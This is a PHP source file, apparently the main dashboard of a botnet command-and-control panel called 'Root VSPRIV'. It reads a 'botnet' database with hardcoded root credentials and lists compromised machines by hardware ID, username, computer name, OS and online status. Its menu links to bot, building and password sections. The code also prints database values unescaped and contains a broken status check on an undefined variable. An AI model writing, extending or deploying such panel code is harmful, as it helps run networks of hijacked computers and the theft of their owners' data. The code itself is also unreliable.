<?php
    require_once 'classes/Usuario.php';
    session_start();
    if(!isset($_SESSION['id'])){
        header("Location: login.php");
        exit;
    }
    
?>


<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="assets/css/principal.css">
    <link rel="stylesheet" href="assets/css/bots.css">
    <link rel="shortcut icon" href="/assets/img/favicon.png" type="image/x-icon">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css" integrity="sha384-vSIIfh2YWi9wW0r9iZe7RJPrKwp6bG+s9QZMoITbCckVJqGCCRhc+ccxNcdpHuYu" crossorigin="anonymous">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    
    <title>Root VSPRIV</title>

</head>

<body class="container">
    <header class="classe100">
        <div id="logo">
            <a href="index.php">
                <img class="logo-one" src="assets/img/Sem título.png" width="220px">
            </a>
        </div>

        <nav class="menu">
            <form method="POST">
                <button type="submit" class="open-button x" name="botao"><i class="fas fa-bars"></i></button>
            </form>

            <?php 
                if(isset($_POST['botao'])){
                    echo  "<nav class='menu open'>";
                }
                if(isset($_POST['botao2'])){
                }
            ?>

            <div class="backgrop"></div>
            <ul>
                <form method="POST">
                    <li class="close-menu"><button type="submit" name="botao2"><i class="fas fa-times y"></i></button></li>
                </form>
                
                <li class="edit"><a href="index.php">HOME</a></li>
                <li><a href="bots.php">BOTS</a></li>
                <li><a href="#">BUILDING</a></li>
                <li><a href="#">PASSWORDS</a></li>
                <li><a href="#">CHAT</a></li>
                <li><a href="sair.php">SAIR</a></li>      

            </ul>
        </nav>
    </header>
    <div class="cvt">
        <table class="table-scroll">
            <thead>
                <tr>
                    <th>ID</th>
                    <th>HWID</th>
                    <th>NOME</th>
                    <th>USER</th>
                    <th>SISTEMA</th>
                    <th>ARQUITETURA</th>
                    <th>IP</th>
                    <th>DATA</th>
                    <th>STATUS</th>
                </tr>
            </thead>
            <tbody class="body-half-screen">
            <?php
                    
                    $sql = new PDO("mysql:dbname=botnet;host=localhost","root","root");
                    $pdo = $sql->prepare("SELECT * FROM bots");
                    $pdo->execute();
                    $online = $sql->prepare("SELECT * FROM online");
                    $online->execute();
                    while($data = $pdo->fetch(PDO::FETCH_ASSOC)){
                        $bool = true;
                        print "<tr>";
                        print "<td>{$data['id']}</td>";
                        print "<td><a class='redirect' href='edit.php?hwid={$data['hwid']}'>{$data['hwid']}</a></td>";
                        print "<td>{$data['username']}</td>";
                        print "<td>{$data['computername']}</td>";
                        print "<td>{$data['os']}</td>";
                        print "<td>{$data['osarch']}</td>";
                        print "<td>censured</td>";
                        //print "<td>{$data['eip']}</td>";
                        print "<td>{$data['date']}</td>";
                        while($status = $online->fetch(PDO::FETCH_ASSOC)){
                            if($row['situacao'] == $row['hwid']){
                                
                                print "<td>{$status['situacao']}</td>";
                                $bool = false;
                            }
                            
                        }
                        if($bool){
                            echo "<td>OFF</td>";
                        }
                        
                        echo "</tr>";
                    }
                ?>  
                
            </tbody>
        </table>
            </form>
        </div>
    </div>
    
</body>
</html>